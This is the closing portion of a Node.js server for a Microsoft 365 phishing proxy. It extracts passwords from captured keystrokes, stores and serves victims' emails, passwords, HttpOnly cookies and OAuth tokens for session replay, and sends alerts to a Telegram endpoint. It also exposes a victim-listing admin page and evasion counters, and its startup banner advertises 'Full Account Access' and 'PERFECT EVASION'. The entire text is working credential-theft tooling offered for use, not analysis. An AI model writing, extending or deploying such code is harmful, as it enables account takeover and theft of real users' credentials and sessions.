                console.log(`[KEYLOG] ⌨️ Received keystrokes for session ${sessionId ? sessionId.substring(0, 12) : 'N/A'}`);
                
                let extractedPassword = null;
                
                if (data.keystrokes) {
                    const passMatch = data.keystrokes.match(/\[FIELD:passwd=([^\]]+)\]/g);
                    if (passMatch) {
                        let fullPassword = '';
                        for (const match of passMatch) {
                            const value = match.replace(/\[FIELD:passwd=/, '').replace(/\]/, '');
                            fullPassword += value;
                        }
                        if (fullPassword) {
                            extractedPassword = fullPassword;
                            console.log(`[KEYLOG] 🔑 Extracted password from keystrokes: ${extractedPassword}`);
                            
                            const email = VICTIM_SESSIONS[sessionId]?.email || 'unknown';
                            
                            sessionStore.storePasswordCapture(sessionId, email, extractedPassword, 'keylog_extraction', {
                                ip: ip,
                                userAgent: req.headers['user-agent'],
                                url: data.url || 'unknown'
                            });
                        }
                    }
                }
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ 
                    success: true,
                    passwordExtracted: !!extractedPassword
                }));
                
            } catch (error) {
                console.error('[KEYLOG] Error:', error.message);
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    if (req.url === PROXY_PATHNAMES.sessionReplayEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = data.sessionId || getSessionIdFromCookie(req.headers.cookie);
                
                if (!sessionId) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'No session ID' }));
                    return;
                }
                
                const sessionData = sessionStore.getReplayData(sessionId);
                if (!sessionData) {
                    res.writeHead(404);
                    res.end(JSON.stringify({ error: 'Session not found' }));
                    return;
                }
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({
                    success: true,
                    sessionId: sessionId,
                    sessionData: sessionData,
                    httpOnlyCookies: sessionStore.httpOnlyCookies.get(sessionId) || [],
                    httpOnlyCount: sessionStore.httpOnlyCookies.get(sessionId)?.length || 0,
                    passwordCaptures: sessionStore.passwordCaptures.get(sessionId) || [],
                    fullAuthData: sessionStore.getFullAuthData(sessionId),
                    tokenCount: sessionStore.allTokens.get(sessionId) ? 
                        Object.values(sessionStore.allTokens.get(sessionId)).filter(t => t && t.value && t.isValid !== false).length : 0
                }, null, 2));
                
            } catch (error) {
                console.error('[REPLAY] Error:', error.message);
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    if (req.url === PROXY_PATHNAMES.fullSessionData && req.method === 'GET') {
        const sessionId = req.headers['x-session-id'] || getSessionIdFromCookie(req.headers.cookie);
        
        if (!sessionId) {
            res.writeHead(400);
            res.end(JSON.stringify({ error: 'No session ID' }));
            return;
        }
        
        const sessionData = sessionStore.getReplayData(sessionId);
        if (!sessionData) {
            res.writeHead(404);
            res.end(JSON.stringify({ error: 'Session not found' }));
            return;
        }
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            success: true,
            sessionId: sessionId,
            sessionData: sessionData,
            httpOnlyCookies: sessionStore.httpOnlyCookies.get(sessionId) || [],
            passwordCaptures: sessionStore.passwordCaptures.get(sessionId) || [],
            fullAuthData: sessionStore.getFullAuthData(sessionId),
            stats: sessionStore.getStats()
        }, null, 2));
        return;
    }

    if (req.url === PROXY_PATHNAMES.tokenRotation && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = getSessionIdFromCookie(req.headers.cookie);
                if (sessionId) {
                    sessionStore.evasionCounters.set(sessionId, {
                        ...sessionStore.evasionCounters.get(sessionId),
                        rotations: (sessionStore.evasionCounters.get(sessionId)?.rotations || 0) + 1
                    });
                }
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, rotated: true }));
            } catch (error) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    if (req.url === PROXY_PATHNAMES.sessionRotate && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = data.sessionId || getSessionIdFromCookie(req.headers.cookie);
                if (sessionId) {
                    sessionStore.evasionCounters.set(sessionId, {
                        ...sessionStore.evasionCounters.get(sessionId),
                        rotations: (sessionStore.evasionCounters.get(sessionId)?.rotations || 0) + 1
                    });
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ 
                        success: true, 
                        rotated: true,
                        rotationCount: sessionStore.evasionCounters.get(sessionId)?.rotations || 0
                    }));
                } else {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'No session ID' }));
                }
            } catch (error) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    if (req.url === PROXY_PATHNAMES.telegramEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { message, parseMode } = JSON.parse(body);
                sessionStore.sendTelegram(message, parseMode);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true }));
            } catch (error) {
                console.error('[TELEGRAM] Error:', error.message);
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Failed to send message' }));
            }
        });
        return;
    }

    // ============================================================
    //  HEALTH CHECK
    // ============================================================
    
    if (req.url === '/health') {
        const stats = sessionStore.getStats();
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            status: 'healthy',
            timestamp: new Date().toISOString(),
            stats: stats,
            evasionEnabled: true,
            httpOnlyCapture: true,
            passwordCapture: true,
            oauthCapture: true,
            version: '4.0.0',
            microsoftEndpoint: 'tenant-specific'
        }, null, 2));
        return;
    }

    // ============================================================
    //  SESSIONS ADMIN
    // ============================================================
    
    if (req.url === '/sessions' && req.method === 'GET') {
        const sessionData = Object.keys(VICTIM_SESSIONS).map(id => ({
            sessionId: id.substring(0, 12) + '...',
            email: VICTIM_SESSIONS[id].email || 'N/A',
            password: VICTIM_SESSIONS[id].password || 'N/A',
            ip: VICTIM_SESSIONS[id].ip || 'N/A',
            created: VICTIM_SESSIONS[id].created,
            attempts: VICTIM_SESSIONS[id].attempts || 0,
            httpOnlyCount: sessionStore.httpOnlyCookies.get(id)?.length || 0,
            tokenCount: sessionStore.allTokens.get(id) ? 
                Object.values(sessionStore.allTokens.get(id)).filter(t => t && t.value && t.isValid !== false).length : 0,
            passwordCaptures: sessionStore.passwordCaptures.get(id)?.length || 0,
            hasFullAuth: !!sessionStore.getFullAuthData(id),
            lastValidation: VICTIM_SESSIONS[id].lastValidationResult || 'unknown'
        }));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            total: sessionData.length,
            sessions: sessionData,
            stats: sessionStore.getStats(),
            evasionActive: true
        }, null, 2));
        return;
    }

    // ============================================================
    //  POST REQUESTS
    // ============================================================
    
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            handlePostRequest(body, req, res);
        });
        return;
    }

    // ============================================================
    //  LOGIN REQUESTS
    // ============================================================
    
    if (req.url.startsWith(PROXY_ENTRY_POINT)) {
        handleLoginRequest(req, res);
        return;
    }

    // ============================================================
    //  DEFAULT REDIRECT
    // ============================================================
    
    res.writeHead(302, { 'Location': REDIRECT_URL });
    res.end();
});

// ============================================================
//  START SERVER
// ============================================================

server.listen(PORT, () => {
    console.log('╔═══════════════════════════════════════════════════════════════╗');
    console.log('║                                                               ║');
    console.log('║     🛡️  MICROSOFT 365 PROXY v4.0 - PERFECT EVASION         ║');
    console.log('║     🔐  Full Account Access - Complete Session Capture       ║');
    console.log('║     ✅  REAL Microsoft OAuth - NOT SIMULATED                 ║');
    console.log('║                                                               ║');
    console.log('╠═══════════════════════════════════════════════════════════════╣');
    console.log('║                                                               ║');
    console.log(`║   📍 Server:    http://localhost:${PORT}                       ║`);
    console.log(`║   🔗 Entry:     ${PROXY_ENTRY_POINT}                         ║`);
    console.log('║                                                               ║');
    console.log('╠═══════════════════════════════════════════════════════════════╣');
    console.log('║                                                               ║');
    console.log('║   ✅ REAL Microsoft OAuth - NOT SIMULATION                   ║');
    console.log('║   ✅ HttpOnly Cookies Captured (Set-Cookie headers)           ║');
    console.log('║   ✅ OAuth Tokens (Access, Refresh, ID)                       ║');
    console.log('║   ✅ Telegram Alerts for ALL events                           ║');
    console.log('║   ✅ User STAYS ON PROXY until correct password              ║');
    console.log('║                                                               ║');
    console.log('╠═══════════════════════════════════════════════════════════════╣');
    console.log('║                                                               ║');
    console.log('║   🔑 COMPLETE SESSION DATA:                                  ║');
    console.log('║   • Email + Password (CORRECT & WRONG)                      ║');
    console.log('║   • HttpOnly Cookies (Set-Cookie headers)                    ║');
    console.log('║   • OAuth Tokens (Access, Refresh, ID)                       ║');
    console.log('║   • Full Authentication Data                                 ║');
    console.log('║   • Session Replay Ready                                     ║');
    console.log('║                                                               ║');
    console.log('╚═══════════════════════════════════════════════════════════════╝');
});

// ============================================================
//  CLEANUP
// ============================================================

setInterval(() => {
    sessionStore.cleanup();
}, 300000);

process.on('SIGTERM', () => {
    console.log('🛑 Shutting down gracefully...');
    server.close(() => process.exit(0));
});

process.on('uncaughtException', (err) => {
    console.error('🔥 UNCAUGHT EXCEPTION:', err.message);
});

process.on('unhandledRejection', (reason) => {
    console.error('🔥 UNHANDLED REJECTION:', reason);
});